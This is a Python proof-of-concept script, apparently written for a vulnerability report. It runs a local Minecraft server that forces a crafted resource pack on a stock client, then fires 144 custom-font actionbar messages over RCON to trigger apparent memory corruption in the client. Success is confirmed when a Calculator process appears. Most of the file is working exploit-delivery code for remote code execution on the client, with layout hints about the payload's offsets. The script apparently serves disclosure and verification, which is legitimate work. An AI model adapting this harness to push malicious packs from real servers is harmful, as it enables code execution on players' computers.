import ctypes
from ctypes import wintypes
import hashlib
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import json
import os
from pathlib import Path
import shutil
import socket
import struct
import subprocess
import sys
import threading
import time
import uuid

from bootstrap import prepare_dependencies


ROOT = Path(__file__).resolve().parent
PACK = ROOT / "resource-pack.zip"
PACK_SHA1 = "F2E2859318152E32FC331D2291C2EC40FFB3C372"
PLAYER = "ProofClient"
SERVER_PORT = 25565
HTTP_PORT = 8766
RCON_PORT = 25575
QUIET_SECONDS = 15


class ProcessEntry(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.c_size_t),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", ctypes.c_long),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", wintypes.WCHAR * 260),
    ]


def calculator_processes():
    kernel = ctypes.WinDLL("kernel32", use_last_error=True)
    kernel.CreateToolhelp32Snapshot.argtypes = (wintypes.DWORD, wintypes.DWORD)
    kernel.CreateToolhelp32Snapshot.restype = wintypes.HANDLE
    kernel.Process32FirstW.argtypes = (wintypes.HANDLE, ctypes.POINTER(ProcessEntry))
    kernel.Process32FirstW.restype = wintypes.BOOL
    kernel.Process32NextW.argtypes = (wintypes.HANDLE, ctypes.POINTER(ProcessEntry))
    kernel.Process32NextW.restype = wintypes.BOOL
    kernel.CloseHandle.argtypes = (wintypes.HANDLE,)
    snapshot = kernel.CreateToolhelp32Snapshot(2, 0)
    if snapshot == ctypes.c_void_p(-1).value:
        raise OSError(ctypes.get_last_error(), "Could not enumerate Windows processes")
    found = set()
    try:
        entry = ProcessEntry()
        entry.dwSize = ctypes.sizeof(ProcessEntry)
        has_entry = kernel.Process32FirstW(snapshot, ctypes.byref(entry))
        while has_entry:
            if entry.szExeFile.lower() in {"calc.exe", "calculatorapp.exe"}:
                found.add(int(entry.th32ProcessID))
            has_entry = kernel.Process32NextW(snapshot, ctypes.byref(entry))
    finally:
        kernel.CloseHandle(snapshot)
    return found


def visible_calculator_window(process_ids):
    user = ctypes.WinDLL("user32", use_last_error=True)
    user.IsWindowVisible.argtypes = (wintypes.HWND,)
    user.IsWindowVisible.restype = wintypes.BOOL
    user.GetWindowThreadProcessId.argtypes = (wintypes.HWND, ctypes.POINTER(wintypes.DWORD))
    user.GetWindowThreadProcessId.restype = wintypes.DWORD
    user.GetWindowTextLengthW.argtypes = (wintypes.HWND,)
    user.GetWindowTextLengthW.restype = ctypes.c_int
    user.GetWindowTextW.argtypes = (wintypes.HWND, wintypes.LPWSTR, ctypes.c_int)
    user.GetWindowTextW.restype = ctypes.c_int
    windows = []
    callback_type = ctypes.WINFUNCTYPE(wintypes.BOOL, wintypes.HWND, wintypes.LPARAM)

    def inspect(window, _):
        if not user.IsWindowVisible(window):
            return True
        pid = wintypes.DWORD()
        user.GetWindowThreadProcessId(window, ctypes.byref(pid))
        length = user.GetWindowTextLengthW(window)
        title = ""
        if length:
            buffer = ctypes.create_unicode_buffer(length + 1)
            user.GetWindowTextW(window, buffer, len(buffer))
            title = buffer.value
        if int(pid.value) in process_ids or "calculator" in title.lower():
            windows.append((int(pid.value), title))
        return True

    callback = callback_type(inspect)
    user.EnumWindows.argtypes = (callback_type, wintypes.LPARAM)
    user.EnumWindows.restype = wintypes.BOOL
    user.EnumWindows(callback, 0)
    return windows


def monitor_calculator(baseline, observed):
    current = calculator_processes()
    for pid in sorted(current - baseline - observed):
        observed.add(pid)
        print(f"CALCULATOR_PROCESS PID={pid}", flush=True)
    return bool(observed)


def wait_for_calculator(baseline, observed, seconds):
    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline:
        if monitor_calculator(baseline, observed):
            return True
        time.sleep(0.25)
    return monitor_calculator(baseline, observed)


def require_free_ports():
    for port in (SERVER_PORT, HTTP_PORT, RCON_PORT):
        with socket.socket() as probe:
            if probe.connect_ex(("127.0.0.1", port)) == 0:
                raise RuntimeError(f"Local port {port} is already in use")


def make_pack_server(served_event):
    class PackHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            if self.path != "/resource-pack.zip":
                self.send_error(404)
                return
            self.send_response(200)
            self.send_header("Content-Type", "application/zip")
            self.send_header("Content-Length", str(PACK.stat().st_size))
            self.end_headers()
            with PACK.open("rb") as source:
                shutil.copyfileobj(source, self.wfile)
            served_event.set()
            print("PACK_SERVED resource-pack.zip", flush=True)

        def log_message(self, format_string, *args):
            return

    server = ThreadingHTTPServer(("127.0.0.1", HTTP_PORT), PackHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server, thread


def write_server_files(server_dir, rcon_password):
    (server_dir / "eula.txt").write_text("eula=true\n", encoding="ascii")
    lines = [
        "server-ip=127.0.0.1",
        f"server-port={SERVER_PORT}",
        "online-mode=false",
        "enforce-secure-profile=false",
        "white-list=false",
        "enforce-whitelist=false",
        "enable-status=true",
        "max-players=4",
        "view-distance=2",
        "simulation-distance=2",
        "difficulty=peaceful",
        "spawn-monsters=false",
        "pause-when-empty-seconds=0",
        "sync-chunk-writes=false",
        "level-type=minecraft:flat",
        "level-name=world-proof",
        "accepts-transfers=true",
        "enable-rcon=true",
        f"rcon.port={RCON_PORT}",
        f"rcon.password={rcon_password}",
        "broadcast-rcon-to-ops=false",
        f"resource-pack=http://127.0.0.1:{HTTP_PORT}/resource-pack.zip",
        f"resource-pack-sha1={PACK_SHA1}",
        f"resource-pack-id={uuid.uuid4()}",
        "require-resource-pack=true",
    ]
    (server_dir / "server.properties").write_text("\n".join(lines) + "\n", encoding="ascii")


def text_contains(path, needle):
    try:
        return needle in path.read_text(encoding="utf-8", errors="replace")
    except FileNotFoundError:
        return False


def wait_for(label, predicate, timeout, processes):
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if predicate():
            return
        for process in processes:
            if process.poll() is not None:
                raise RuntimeError(f"{label}: a Minecraft process exited early with code {process.returncode}")
        time.sleep(0.25)
    raise TimeoutError(f"Timed out waiting for {label}")


def rcon_packet(request_id, packet_type, text):
    payload = struct.pack("<ii", request_id, packet_type) + text.encode("utf-8") + b"\0\0"
    return struct.pack("<i", len(payload)) + payload


def recv_exact(connection, count):
    chunks = []
    while count:
        chunk = connection.recv(count)
        if not chunk:
            raise ConnectionError("RCON connection closed")
        chunks.append(chunk)
        count -= len(chunk)
    return b"".join(chunks)


def rcon_receive(connection):
    length = struct.unpack("<i", recv_exact(connection, 4))[0]
    if not 10 <= length <= 4096:
        raise ValueError(f"Unexpected RCON packet length {length}")
    payload = recv_exact(connection, length)
    request_id, packet_type = struct.unpack("<ii", payload[:8])
    return request_id, packet_type, payload[8:-2].decode("utf-8", errors="replace")


def run_phase(phase, password, baseline, observed, log_path):
    print(f"PHASE_{phase} BEGIN 144 fonts glyph=U+{ord(phase):04X} ({ord(phase)})", flush=True)
    delay = 0.65 if phase == "F" else 1.2
    with socket.create_connection(("127.0.0.1", RCON_PORT), timeout=10) as connection:
        connection.settimeout(10)
        connection.sendall(rcon_packet(1, 3, password))
        auth_id, _, _ = rcon_receive(connection)
        if auth_id != 1:
            raise RuntimeError("RCON authentication failed")
        with log_path.open("w", encoding="utf-8") as log:
            for face in range(144):
                font_name = f"deferred-{face:03d}"
                body = json.dumps({"text": phase, "font": f"ctf:{font_name}"}, separators=(",", ":"))
                request_id = face + 2
                connection.sendall(rcon_packet(request_id, 2, f"title {PLAYER} actionbar {body}"))
                response_id, _, response = rcon_receive(connection)
                if response_id != request_id or "Showing new actionbar" not in response:
                    raise RuntimeError(f"Phase {phase} font {font_name}: {response}")
                message = f"{phase} {face + 1:03d}/144 font={font_name} accepted"
                print(message, flush=True)
                log.write(message + "\n")
                log.flush()
                monitor_calculator(baseline, observed)
                if phase == "A" and observed:
                    return
                time.sleep(delay)
                monitor_calculator(baseline, observed)
                if phase == "A" and observed:
                    return
    print(f"PHASE_{phase} COMPLETE 144/144", flush=True)


def stop_owned(process):
    if process is None or process.poll() is not None:
        return
    process.terminate()
    try:
        process.wait(timeout=15)
    except subprocess.TimeoutExpired:
        process.kill()
        process.wait(timeout=5)


def main():
    if sys.platform != "win32":
        raise RuntimeError("This proof requires Windows x64")
    if hashlib.sha1(PACK.read_bytes()).hexdigest().upper() != PACK_SHA1:
        raise RuntimeError("resource-pack.zip does not match the validated SHA1")
    print("PACK_LAYOUT points=104 vector_bytes=832 (0x340) sweep=128 (0x80)", flush=True)
    print("VM_LAYOUT stack_cells=12288 stack_bytes=49152 (0xC000) chain_offset=28672 (0x7000)", flush=True)
    require_free_ports()
    manifest = prepare_dependencies(ROOT)
    required = ("client_jar", "server_runtime_jar", "server_launch_mode", "natives_dir",
                "assets_dir", "classpath_file", "logging_path_file", "options_file",
                "trusted_servers_dat", "java_path", "asset_index")
    for key in required:
        if not manifest.get(key):
            raise RuntimeError(f"Dependency bootstrap did not provide {key}")
    if manifest["server_launch_mode"] != "jar":
        raise RuntimeError("This PoC requires an official server JAR")
    run_dir = ROOT / "runs" / (time.strftime("%Y%m%d-%H%M%S") + "-" + uuid.uuid4().hex[:8])
    server_dir = run_dir / "server"
    client_dir = run_dir / "client-game"
    server_dir.mkdir(parents=True)
    client_dir.mkdir(parents=True)
    shutil.copy2(manifest["options_file"], client_dir / "options.txt")
    shutil.copy2(manifest["trusted_servers_dat"], client_dir / "servers.dat")
    rcon_password = uuid.uuid4().hex
    write_server_files(server_dir, rcon_password)
    baseline = calculator_processes()
    observed = set()
    served_event = threading.Event()
    server_http = None
    game_server = None
    game_client = None
    handles = []
    result = {"success": False, "calculator_pids": [], "calculator_window_visible": False,
              "pack_sha1": PACK_SHA1, "run_dir": str(run_dir)}
    try:
        server_http, _ = make_pack_server(served_event)
        server_out = (run_dir / "server.stdout.log").open("w", encoding="utf-8")
        server_err = (run_dir / "server.stderr.log").open("w", encoding="utf-8")
        handles.extend((server_out, server_err))
        java = str(manifest["java_path"])
        server_args = [java, "-Xms256M", "-Xmx1G", "-jar", str(manifest["server_runtime_jar"]), "nogui"]
        game_server = subprocess.Popen(server_args, cwd=server_dir, stdout=server_out,
                                       stderr=server_err, creationflags=subprocess.CREATE_NO_WINDOW)
        wait_for("server startup", lambda: text_contains(run_dir / "server.stdout.log", "Done ("), 180,
                 (game_server,))
        client_out = (run_dir / "client.stdout.log").open("w", encoding="utf-8")
        client_err = (run_dir / "client.stderr.log").open("w", encoding="utf-8")
        handles.extend((client_out, client_err))
        natives = str(manifest["natives_dir"])
        logging_path = Path(manifest["logging_path_file"]).read_text(encoding="utf-8").strip()
        classpath = Path(manifest["classpath_file"]).read_text(encoding="utf-8").strip()
        client_args = [
            java, "-Xms2G", "-Xmx4G", "-XX:+UseCompactObjectHeaders", "-XX:+AlwaysPreTouch",
            "-XX:+UseStringDeduplication", "-XX:+UseZGC", "-XX:StackShadowPages=32",
            f"-XX:HeapDumpPath={run_dir / 'java_heapdump.hprof'}",
            f"-XX:ErrorFile={run_dir / 'hs_err.log'}",
            "--enable-native-access=ALL-UNNAMED",
            "--add-exports", "java.base/jdk.internal.misc=ALL-UNNAMED",
            f"-Djava.library.path={natives}", f"-Djna.tmpdir={natives}",
            f"-Dorg.lwjgl.system.SharedLibraryExtractPath={natives}",
            f"-Dio.netty.native.workdir={natives}",
            "-Dminecraft.launcher.brand=local-proof", "-Dminecraft.launcher.version=1",
            f"-Dlog4j.configurationFile={logging_path}", "-cp", classpath,
            "net.minecraft.client.main.Main", "--username", PLAYER, "--version", "26.3",
            "--gameDir", str(client_dir), "--assetsDir", str(manifest["assets_dir"]),
            "--assetIndex", str(manifest["asset_index"]),
            "--uuid", "00000000000000000000000000000001", "--accessToken", "0",
            "--clientId", "0", "--xuid", "0", "--versionType", "release",
            "--width", "960", "--height", "540", "--quickPlayMultiplayer", f"127.0.0.1:{SERVER_PORT}",
        ]
        game_client = subprocess.Popen(client_args, cwd=client_dir, stdout=client_out, stderr=client_err)
        print(f"STOCK_CLIENT_STARTED PID={game_client.pid}", flush=True)
        wait_for("client join and pack fetch",
                 lambda: served_event.is_set() and text_contains(run_dir / "server.stdout.log", f"{PLAYER} joined the game"),
                 240, (game_server, game_client))
        wait_for("client resource-pack reload",
                 lambda: any("Reloading ResourceManager" in line and "server/" in line
                             for line in (client_dir / "logs" / "latest.log").read_text(
                                 encoding="utf-8", errors="replace").splitlines())
                 if (client_dir / "logs" / "latest.log").exists() else False,
                 90, (game_server, game_client))
        print("STOCK_CLIENT_PACK_READY", flush=True)
        print(f"QUIET_BEFORE_F={QUIET_SECONDS} seconds", flush=True)
        time.sleep(QUIET_SECONDS)
        run_phase("F", rcon_password, baseline, observed, run_dir / "phase-F.log")
        print(f"QUIET_BEFORE_A={QUIET_SECONDS} seconds", flush=True)
        time.sleep(QUIET_SECONDS)
        try:
            run_phase("A", rcon_password, baseline, observed, run_dir / "phase-A.log")
        except (ConnectionError, OSError, RuntimeError) as error:
            if not wait_for_calculator(baseline, observed, 5):
                raise error
            print("PHASE_A INTERRUPTED after Calculator launched", flush=True)
        if not wait_for_calculator(baseline, observed, 5):
            raise RuntimeError("No new Calculator process appeared")
        deadline = time.monotonic() + 10
        windows = []
        while time.monotonic() < deadline:
            windows = visible_calculator_window(observed)
            if windows:
                break
            time.sleep(0.25)
        result["success"] = True
        result["calculator_pids"] = sorted(observed)
        result["calculator_window_visible"] = bool(windows)
        print(f"POC_SUCCESS Calculator PID(s): {', '.join(map(str, sorted(observed)))}", flush=True)
        print(f"CALCULATOR_WINDOW_VISIBLE={bool(windows)}", flush=True)
    except Exception as error:
        if wait_for_calculator(baseline, observed, 5):
            windows = visible_calculator_window(observed)
            result["success"] = True
            result["calculator_pids"] = sorted(observed)
            result["calculator_window_visible"] = bool(windows)
            print(f"POC_SUCCESS Calculator PID(s): {', '.join(map(str, sorted(observed)))}", flush=True)
            print(f"CALCULATOR_WINDOW_VISIBLE={bool(windows)}", flush=True)
        else:
            result["error"] = str(error)
            print(f"POC_FAILURE {error}", flush=True)
    finally:
        stop_owned(game_client)
        stop_owned(game_server)
        if server_http is not None:
            server_http.shutdown()
            server_http.server_close()
        for handle in handles:
            handle.close()
        (run_dir / "result.json").write_text(json.dumps(result, indent=2) + "\n", encoding="utf-8")
        print(f"RESULT_FILE={run_dir / 'result.json'}", flush=True)
        print("Calculator remains open for reviewer inspection when launched", flush=True)
    return 0 if result["success"] else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as error:
        print(f"POC_FAILURE {error}", file=sys.stderr, flush=True)
        sys.exit(1)
